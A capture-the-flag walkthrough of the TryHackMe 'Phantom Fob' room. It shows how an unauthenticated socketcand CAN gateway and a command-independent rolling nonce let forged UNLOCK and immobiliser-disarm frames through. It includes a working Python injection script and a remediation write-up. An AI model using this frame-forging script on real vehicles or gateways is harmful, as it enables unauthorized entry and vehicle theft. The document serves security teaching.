# TryHackMe: Phantom Fob — Forging a CAN Bus "Unlock" the Key Fob Can't Send

*A walkthrough of the "Phantom Fob" room (Penetration Tester, Level Mid). This
one has no web shell and no SUID chain — it's car hacking. We plug into a demo
vehicle's CAN bus, reverse-engineer how its door commands are framed, and mint
an UNLOCK message that the physical key fob is deliberately built never to send.
The manufacturer's claim that the command "can't be copied" turns out to be
exactly wrong.*

> The flag value is redacted. This is a retired training box on TryHackMe;
> nothing here is aimed at any vehicle or system without authorization.

---

## TL;DR

1. **Recon** — SSH, a Flask "Instrument Cluster" web app on 8080, and a strange
   service on 29536 that answers every probe with `< hi >`.
2. **The odd port** — 29536 is a **socketcand** gateway: a raw, unauthenticated
   bridge onto the car's `vcan0` CAN bus.
3. **Reverse-engineering** — legitimate fob frames arrive on CAN ID `2A2` with a
   fixed structure: `E8 [CMD] [NONCE] 29 [CTR] 8F [CHK]`.
4. **The flaw** — the rolling `NONCE` protects *timing*, not the *command*. It
   never signs *what action* is requested.
5. **Forgery** — observe one live frame, reuse its fresh nonce, bump the counter,
   recompute the checksum, and send `CMD=0x17` (UNLOCK) — a command the fob UI
   omits entirely.
6. **Loot** — doors unlock, immobiliser disarms, and the ECU streams the flag out
   over the web app's `/events` feed.

The theme of the whole box: **a rolling code that authenticates timing but not
intent is not authentication at all.**

---

## 1. Recon

Standard full service scan — but the interesting part isn't SSH:

```bash
export IP=<target-ip>
nmap -sT -sV -sC -p22,8080,29536 -Pn -T4 -oN nmap-services.txt $IP
```

```
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu
8080/tcp  open  http    Werkzeug httpd 3.1.8 (Python 3.12.3)
|_http-title: Instrument Cluster
29536/tcp open  unknown
|   ... every single probe returns:
|_    < hi >
```

Three ports tell a story:

- **8080** — a Flask/Werkzeug app titled *Instrument Cluster*. This is the car's
  dashboard, and (as we'll see) the thing that lets us press fob buttons and read
  the vehicle state.
- **29536** — nmap can't fingerprint it. It replies to *every* protocol probe
  with the same six bytes: `< hi >`. That `<...>` framing is the tell. This is a
  **socketcand** server — a network front-end that speaks a tiny ASCII protocol
  and bridges TCP clients straight onto a CAN bus.

No web exploit, no credentials to crack. The whole room lives on that CAN
gateway.

## 2. A one-minute primer on CAN

Modern cars have an internal network called the **CAN bus**. Every component —
doors, dashboard, engine, immobiliser — talks to every other component by
broadcasting short messages onto one shared wire. There's no "to" address: a
frame carries an **arbitration ID** (which loosely identifies the *kind* of
message) and up to 8 data bytes, and everyone on the bus sees it.

Crucially, classic CAN has **no built-in authentication**. Any node that can put
bytes on the wire can claim to be any other node. Security, when it exists, is
bolted on top in the message payload — which is exactly where this room's design
falls down.

We've been handed a key fob that can **Lock** the car and sound the **Horn**, but
has *no Unlock button*. The manufacturer says the unlock command can't be copied.
Our job: watch the traffic, figure out how the door commands are built, and craft
Unlock ourselves.

## 3. Talking to the gateway

socketcand's protocol is line-oriented ASCII wrapped in angle brackets. The
handshake to start seeing traffic is `open` the interface, then switch to
`rawmode`:

```bash
printf '< open vcan0 >< rawmode >' | nc $IP 29536   # streams live frames
```

Frames start scrolling past:

```
< frame 2A2 <ts> E8 72 <NN NN> 29 <CC> 8F <CHK> >
```

No login. No token. The gateway happily accepts `open` → `rawmode` → `send` from
any client on the network. That's flaw number one: **the transmit path onto a
safety-critical bus is exposed with zero authentication.**

## 4. Reverse-engineering the fob frames

Watching the bus while pressing buttons on the dashboard app (8080) shows that
all fob traffic lands on **CAN ID `2A2`** with a consistent 8-byte shape:

```
E8 [CMD] [NONCE:2] 29 [CTR] 8F [CHK]
```

Pressing each available button reveals the command byte:

| Command       | CMD byte |
|---------------|----------|
| LOCK          | `72`     |
| HORN          | `F8`     |
| IMMOB_ARM     | `58`     |
| IMMOB_DISARM  | `B5`     |
| **UNLOCK**    | **`17`** |

`LOCK` and `HORN` are the two buttons we physically have. But the command byte is
just... a byte. Nothing about the frame structure stops us picking `17`.

### The moving parts

- **`NONCE`** (2 bytes) — a rolling code shared by the fob and the ECU that
  rotates on a ~0.5-second timer. This is the "can't be copied" mechanism. But
  it's **independent of the command**: the same nonce is valid for LOCK, HORN, or
  anything else in that time window. It signs *when*, never *what*.
- **`CTR`** (1 byte) — a monotonic counter. The ECU accepts **any** value greater
  than the last one it saw, to stop naive replay.
- **`CHK`** (1 byte) — a checksum over the frame. Feeding a few captured frames
  through XOR reveals the formula:

  ```
  CHK = XOR(byte0 .. byte6) ^ 0xFB
  ```

That's the entire scheme. And it's broken by design.

## 5. The vulnerability

The rolling nonce is meant to make each command unforgeable. But because the
nonce **does not bind the command byte**, the security collapses into a simple
observation:

> If I can see *one* legitimate frame, I learn the current valid `NONCE` and
> `CTR`. Those same values authorise *any* command I choose — including the
> UNLOCK the fob refuses to send.

So the attack is:

1. Trigger a legitimate frame (press LOCK via the dashboard) and read the live
   `NONCE` + `CTR` off ID `2A2`.
2. Within the ~0.5s nonce window, transmit a forged frame reusing that nonce,
   with the next counter value, `CMD=0x17`, and a recomputed checksum.

```
# UNLOCK — the fob has no button for this
< send 2A2 8 E8 17 <NN> <NN> 29 <CC+1> 8F <CHK> >

# IMMOB_DISARM — disable the anti-theft immobiliser for good measure
< send 2A2 8 E8 B5 <NN> <NN> 29 <CC+2> 8F <CHK> >
```

The ECU validates the nonce (still fresh), sees a counter greater than the last
(`CC+1`), verifies the checksum (we computed it correctly), and executes the
command. It has no way to tell this frame came from an attacker rather than the
fob.

### The forged-frame flow

The whole attack is a race against the ~0.5s nonce timer: borrow a live nonce
from a legitimate frame, then spend it on a command the fob would never send —
all before it rotates.

```
   ATTACKER            socketcand         CAN bus          ECU            DASHBOARD
   (script)            tcp/29536          vcan0           (car)          tcp/8080
      |                    |                 |               |                |
      |  < open vcan0 >    |                 |               |                |
      |  < rawmode >       |                 |               |                |
      |------------------->|   (no auth required)            |                |
      |                    |                 |               |                |

  == PHASE 1: harvest a fresh nonce ==================== (race the ~0.5s timer) =
      |                    |                 |               |                |
      |  POST /press {"button":"LOCK"}       |               |                |
      |------------------------------------------------------------------------>|
      |                    |                 |  frame 2A2    |                |
      |                    |                 |  E8 72 [NONCE] 29 [CTR] 8F [CHK]|
      |                    |                 |<-------------------------------|
      |                    |  broadcast (everyone on the bus sees it)          |
      |  < frame 2A2 ... > |<----------------|               |                |
      |<-------------------|                 |               |                |
      |  read NONCE + CTR  |                 |               |                |
      |                    |                 |               |                |

  == PHASE 2: spend that nonce on a forbidden command ==========================
      |                    |                 |               |                |
      | CHK = XOR(byte0..6) ^ 0xFB           |               |                |
      |                    |                 |               |                |
      | < send 2A2 8 E8 17 [NONCE] 29 [CTR+1] 8F [CHK] >   (UNLOCK, CMD=0x17)  |
      |------------------->|  inject forged  |               |                |
      |                    |---------------->|-------------->|                |
      |                    |                 |               |                |
      | < send 2A2 8 E8 B5 [NONCE] 29 [CTR+2] 8F [CHK] >   (DISARM, CMD=0xB5) |
      |------------------->|  inject forged  |               |                |
      |                    |---------------->|-------------->|                |
      |                    |                 |               |                |
      |                    |     ECU checks: nonce fresh? YES               |
      |                    |                 ctr > last?  YES               |
      |                    |                 chk valid?   YES               |
      |                    |     (nothing binds CMD to the nonce)          |
      |                    |                 |  doors UNLOCK, immob DISARM  |
      |                    |                 |               |  state+flag  |
      |                    |                 |               |------------->|
      |  GET /events  ->  {"locked":false,"immob":false,"flag":"THM{...}"}  |
      |<-----------------------------------------------------------------------|
      v                                                                        v
```

The trick is entirely in PHASE 2: the same `NONCE` the ECU issued for a `LOCK` is
replayed to authorise `UNLOCK` and `IMMOB_DISARM`. Because the rolling code never
signs the `CMD` byte, the ECU treats the forgery as genuine.

## 6. Proof of concept

Racing a 0.5-second window by hand is fiddly, so the reliable version is scripted:
one socket does capture *and* injection, a background thread parses live frames,
and we fire UNLOCK + DISARM inside a single fresh nonce window.

```python
import socket, time, re, threading, urllib.request, json

HOST = "<target-ip>"
s = socket.socket(); s.connect((HOST, 29536)); s.settimeout(2.0)

def rd(t):
    s.settimeout(t); b = b""
    try:
        while True: b += s.recv(4096)
    except: pass
    return b

# handshake: open the bus, switch to raw frame mode
rd(1.0); s.sendall(b"< open vcan0 >"); rd(1.0); s.sendall(b"< rawmode >")

last = [None]; stop = [False]

def reader():                       # background: track the newest 2A2 frame
    s.settimeout(0.15); buf = ""
    while not stop[0]:
        try: buf += s.recv(8192).decode(errors="replace")
        except: continue
        for msg in re.findall(r"<[^>]*>", buf):
            m = re.match(r"<\s*frame\s+2A2\s+\S+\s+(.*?)\s*>", msg)
            if m: last[0] = (time.time(), m.group(1).strip())
        if ">" in buf: buf = buf[buf.rindex(">") + 1:]
threading.Thread(target=reader, daemon=True).start()

def press(b):                       # press a dashboard button to emit a real frame
    urllib.request.urlopen(urllib.request.Request(
        "http://%s:8080/press" % HOST,
        ('{"button":"%s"}' % b).encode(),
        {"Content-Type": "application/json"}), timeout=5).read()

def chk(b):                         # CHK = XOR(byte0..byte6) ^ 0xFB
    x = 0
    for v in b[:7]: x ^= v
    return x ^ 0xFB

def inj(cmd, nonce, ctr):           # forge and send one frame
    b = [0xE8, cmd, (nonce >> 8) & 0xff, nonce & 0xff, 0x29, ctr & 0xff, 0x8F, 0]
    b[7] = chk(b)
    s.sendall(("< send 2A2 8 " + " ".join("%02X" % x for x in b) + " >").encode())

def freshcap():                     # force a legit frame, read its nonce + ctr
    before = last[0][1] if last[0] else None
    press("LOCK")
    for _ in range(50):
        if last[0] and last[0][1] != before: break
        time.sleep(0.02)
    return int(last[0][1][4:8], 16), int(last[0][1][10:12], 16)

time.sleep(1.0)
nonce, ctr = freshcap()
inj(0x17, nonce, ctr + 1)           # UNLOCK
inj(0xB5, nonce, ctr + 2)           # IMMOB_DISARM
print("fired UNLOCK(17)+DISARM(b5) nonce=%04x ctr=%02x" % (nonce, ctr))

# read the flag off the dashboard's SSE event stream
r = urllib.request.urlopen("http://%s:8080/events" % HOST, timeout=8)
t0 = time.time()
while time.time() - t0 < 8:
    l = r.readline().decode()
    if l.startswith("data:"):
        d = json.loads(l[5:].strip())
        if d.get("flag"):
            print("STATE:", {k: d[k] for k in ('locked', 'immob', 'horn')})
            print("FLAG:", d["flag"]); break
r.close(); stop[0] = True; s.close()
```

Running it:

```
fired UNLOCK(17)+DISARM(b5) nonce=<...> ctr=<..>
STATE: {'locked': False, 'immob': False, 'horn': False}
FLAG: THM{__redacted__}
```

The doors unlock, the immobiliser disarms, and the ECU releases the protected
secret on the `/events` feed. Game over — from network access alone, with no fob,
no credentials, and no physical key.

---

## Report: the finding, written up

If you're using this room to practice writing findings (as the Notion notes do),
here's the shape of it.

**Title:** CAN Bus command injection in the socketcand gateway (tcp/29536) allows
an unauthenticated attacker to unlock the vehicle and disarm the immobiliser.

**Severity:** Critical — CVSS 3.1 `9.6` (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`).

**Summary:** An unauthenticated attacker on the network unlocks the car and
disarms the immobiliser by injecting a single CAN frame the key fob is designed
never to send. The socketcand gateway on tcp/29536 permits raw frame transmit
with no authentication; the rolling-code scheme protects only *timing*, not the
*command*, so a fresh rolling value observed from any legitimate fob frame can be
reused to forge a privileged UNLOCK.

**Impact:** Complete bypass of keyless-entry and immobiliser controls from the
network alone. The same primitive forges *any* CAN command the ECU honours. It's
scriptable and reliable.

**Recommended fix:**

- **Authenticate the gateway.** Do not expose socketcand's transmit path
  unauthenticated on the network.
- **Bind the MAC to the command.** Replace the command-independent time nonce
  with a MAC computed over `CMD ‖ CTR` (e.g. AES-CMAC), so a value captured for
  one command can't authorise another.
- **Enforce strict counters.** Require strictly incrementing (`last + 1`)
  counters so captured values can't be reused within a window.

## Takeaways

- **`< hi >` on an unknown port is a lead, not a dead end.** The angle-bracket
  framing is socketcand's signature — recognise the protocol and the whole box
  opens up.
- **Rolling codes are not magic.** A nonce that rotates on a timer only defeats
  *replay of the same command*. If it doesn't cryptographically bind *which*
  command is being sent, an attacker just swaps the command byte and reuses the
  live nonce.
- **Authentication belongs on intent, not timing.** The fix is the lesson: a MAC
  over `CMD ‖ CTR` would have made the forged UNLOCK invalid. The car "couldn't
  copy" the command — but it never checked whether the command matched the code.
- **Classic CAN has no native auth.** Anything that can transmit can impersonate
  any ECU. Network-facing CAN bridges must therefore carry their own strong
  authentication; exposing raw transmit is equivalent to handing out the keys.

Thanks for reading. Phantom Fob is a great little intro to automotive/CAN
security — no memory corruption, no web exploit, just careful observation of a
protocol and the realisation that "can't be copied" was protecting the wrong
half of the message.
